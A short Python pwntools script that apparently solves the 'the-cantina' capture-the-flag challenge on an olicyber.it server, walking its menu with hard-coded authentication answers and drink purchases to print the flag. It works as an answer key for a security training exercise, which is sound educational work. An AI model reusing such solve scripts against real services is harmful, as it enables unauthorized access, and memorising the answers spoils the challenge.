from pwn import *
import re

r = remote("the-cantina.challs.olicyber.it", 38083)

r.recvuntil(b'> ')
r.sendline(b'select_coin')
r.sendline(b'OLI')

r.recvuntil(b'> ')
r.sendline(b'select_wallet')
r.sendline(b'0xBABE')

r.recvuntil(b'> ')
r.sendline(b'authenticate')

r.sendlineafter(b'?\n', b'Han')
r.sendlineafter(b'?\n', b'Vader')
r.sendlineafter(b'?\n', b'Kashyyyk')

r.sendlineafter(b'> ', b'topup_wallet')

r.sendlineafter(b'> ', b'buy_drink')
r.sendline(b'Corellian Ale')

r.sendlineafter(b'> ', b'buy_drink')
r.sendline(b'Darksaber Distillate')

flag = re.findall(r'flag{.*}', r.recvline().decode().strip())[0]
print(flag)